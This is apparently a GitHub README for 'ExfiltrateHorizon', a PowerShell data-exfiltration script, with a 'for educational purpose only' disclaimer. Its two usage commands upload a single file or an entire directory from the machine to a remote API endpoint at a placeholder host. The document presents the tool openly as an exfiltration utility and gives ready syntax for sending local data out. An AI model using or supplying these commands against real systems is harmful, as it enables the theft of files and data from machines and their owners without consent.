```
███████╗██╗  ██╗███████╗██╗██╗  ████████╗██████╗  █████╗ ████████╗███████╗██╗  ██╗ ██████╗ ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗
██╔════╝╚██╗██╔╝██╔════╝██║██║  ╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║  ██║██╔═══██╗██╔══██╗██║╚══███╔╝██╔═══██╗████╗  ██║
█████╗   ╚███╔╝ █████╗  ██║██║     ██║   ██████╔╝███████║   ██║   █████╗  ███████║██║   ██║██████╔╝██║  ███╔╝ ██║   ██║██╔██╗ ██║
██╔══╝   ██╔██╗ ██╔══╝  ██║██║     ██║   ██╔══██╗██╔══██║   ██║   ██╔══╝  ██╔══██║██║   ██║██╔══██╗██║ ███╔╝  ██║   ██║██║╚██╗██║
███████╗██╔╝ ██╗██║     ██║███████╗██║   ██║  ██║██║  ██║   ██║   ███████╗██║  ██║╚██████╔╝██║  ██║██║███████╗╚██████╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
```

-------------------------------------------------------------------

**THIS SCRIPT IS DESIGNED FOR EDUCATIONAL PURPOSE ONLY! DO NOT USE THIS SCRIPT FOR ILLEGAL PURPOSES!**

A lightweight PowerShell script used for data exfiltration to the HorizonBackbone

## Roadmap
- [x] Upload file
- [x] Upload directory
- [ ] Single function usage


## How to use

Load the file `ExfiltrateHorizon.ps1` in a PowerShell session and use the function with the following syntax:

### Single File

```powershell
Upload-File -FilePath "C:\path\to\file.txt" -ApiEndpoint "http://example.com/api/upload"
```

### Directory

```powershell
Upload-Directory -DirectoryPath "C:\path\to\directory" -ApiEndpoint "http://example.com/api/upload"
```

Both the `-DirectoryPath` and the `-ApiEndpoint` parameter are mandatory.

## Images

![image](https://github.com/maxbirnbacher/ExfiltrateHorizon/assets/66524685/f33919ef-cb34-4107-aa73-47ef32be7eef)


